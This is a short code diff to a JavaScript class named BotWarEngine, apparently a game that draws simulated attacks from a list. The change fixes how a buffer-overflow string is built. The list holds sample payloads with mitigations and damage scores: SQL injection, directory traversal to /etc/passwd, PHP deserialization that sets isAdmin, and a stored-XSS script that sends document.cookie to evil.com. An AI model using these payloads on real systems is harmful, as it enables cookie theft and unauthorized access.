@@ -67,7 +67,7 @@ class BotWarEngine {
     generateAttack() {
         const attacks = [
             { type: 'SQL Injection', payload: "' OR 1=1--", mitigation: 'WAF Rule #42', damage: 15 },
-            { type: 'Buffer Overflow', payload: "A" * 512 + "\xef\xbe\xad\xde", mitigation: 'ASLR/DEP Check', damage: 25 },
+            { type: 'Buffer Overflow', payload: "A".repeat(512) + "\xef\xbe\xad\xde", mitigation: 'ASLR/DEP Check', damage: 25 },
             { type: 'XSS Stored', payload: "<script>fetch('https://evil.com?c='+document.cookie)</script>", mitigation: 'CSP Policy', damage: 10 },
             { type: 'Directory Traversal', payload: "../../../etc/passwd", mitigation: 'Chroot/Jail', damage: 20 },
             { type: 'RCE via Deserialization', payload: "O:4:\"User\":1:{s:8:\"isAdmin\";b:1;}", mitigation: 'Input Sanitization', damage: 30 }
